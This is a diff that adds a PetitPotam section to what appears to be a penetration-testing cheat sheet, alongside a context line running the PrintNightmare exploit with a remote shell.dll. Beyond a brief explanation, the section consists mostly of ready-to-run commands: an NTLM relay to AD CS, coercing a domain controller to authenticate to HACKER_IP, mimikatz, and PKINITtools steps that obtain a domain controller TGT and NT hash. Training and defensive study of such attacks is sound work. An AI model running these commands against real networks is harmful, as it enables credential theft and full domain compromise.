@@ -440,6 +440,36 @@ $ git clone -b "main" https://github.com/cube0x0/CVE-2021-1675.git $DEST
 $ python3 $DEST/CVE-2021-1675.py domain/username:password@IP '\\HOST_IP\share\shell.dll'
 ```
 </div><div>
+
+#### PetitPotam
+
+[![active_directory_enumeration_attacks](../../../../cybersecurity/_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)
+
+PetitPotam is based on [CVE-2021-36942](https://nvd.nist.gov/vuln/detail/CVE-2021-36942). An authenticated attacker could connect using NTLM over port 445 by abusing MS-EFSRPC.
+
+If the server runs AD CS, then the hacker can exploit it to eventually get a TGT for the Domain Controller and compromise the domain.
+
+Refer to [this article](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/).
+
+```ps
+$ impacket-ntlmrelayx -debug -smb2support --target http://target/certsrv/certfnsh.asp --adcs --template DomainController
+$ git clone https://github.com/topotam/PetitPotam.git
+$ cd PetitPotam
+$ python3 PetitPotam.py HACKER_IP DCIP
+```
+```shell!
+mimikatz# misc::efs /server:DCIP /connect:HACKER_IP
+```
+
+➡️ See also: [Invoke-Petitpotam.ps1](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-Petitpotam.ps1).
+
+➡️ See also: [PKINITtools](https://github.com/dirkjanm/PKINITtools) <small>(0.6k ⭐)</small> to get a TGT from a certificate:
+
+```ps
+$ python3 gettgtpkinit.py example.com\COMPUTE_ACCOUNT_NAME\$ -pfx-base64 ...SNIP... xxx.ccache
+$ # use ccache file or request a TGS with the user hash
+$ python3 getnthash.py -key <from gettgt> example.com\COMPUTE_ACCOUNT_NAME\$
+```
 </div></div>
 
 <hr class="sep-both">
